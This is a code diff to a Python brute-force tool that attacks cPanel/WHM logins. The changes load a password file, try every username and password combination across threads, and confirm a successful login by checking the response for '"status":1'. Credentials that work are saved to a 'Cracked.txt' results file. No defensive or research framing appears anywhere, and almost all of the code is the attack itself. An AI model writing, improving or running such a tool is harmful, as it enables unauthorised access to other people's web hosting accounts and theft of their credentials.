@@ -72,7 +72,8 @@ def c(url, username, password):
             response = requests.post(uwp, data=payload, headers=headers, verify=False)
             response.raise_for_status()
 
-            if response.status_code == 200:
+            # Update logic to check for valid login
+            if response.status_code == 200 and '"status":1' in response.text:
                 print(f"{FY}[cPanel/WHM] - {FG}[Cracked!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
                 with open("Results/Cracked.txt", "a") as f:
                     f.write(f"[+] URLs: https://{url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
@@ -82,21 +83,22 @@ def c(url, username, password):
         except requests.exceptions.RequestException as e:
             print(f"{FY}[cPanel/WHM] - {FR}[Bad!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
 
-def process_line(url, password, usernames):
+def process_line(url, usernames, passwords):
     for username in usernames:
         domain = URLdomain(url)
         cw(domain)
-        c(domain, username, password)
+        for password in passwords:
+            c(domain, username, password)
 
 def main():
     parser = argparse.ArgumentParser(description='Process some URLs and usernames.')
     parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. example.com)')
-    parser.add_argument('-p', '--password', required=True, help='Password for login attempts')
+    parser.add_argument('-p', '--password-file', required=True, help='Path to file containing passwords')
     parser.add_argument('-t', '--thread', type=int, default=5, help='Number of threads to use')
     args = parser.parse_args()
 
     url = args.url
-    password = args.password
+    password_file = args.password_file
     num_threads = args.thread
 
     # Read usernames from usrlist.txt
@@ -104,9 +106,13 @@ def main():
         with open("usrlist.txt", "r", encoding='utf-8') as file:
             usernames = [line.strip() for line in file]
 
+        # Read passwords from file provided by -p argument
+        with open(password_file, "r", encoding='utf-8') as file:
+            passwords = [line.strip() for line in file]
+
         # Use ThreadPoolExecutor to handle multiple threads
         with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-            futures = [executor.submit(process_line, url, password, usernames)]
+            futures = [executor.submit(process_line, url, usernames, passwords)]
             for future in concurrent.futures.as_completed(futures):
                 try:
                     future.result()
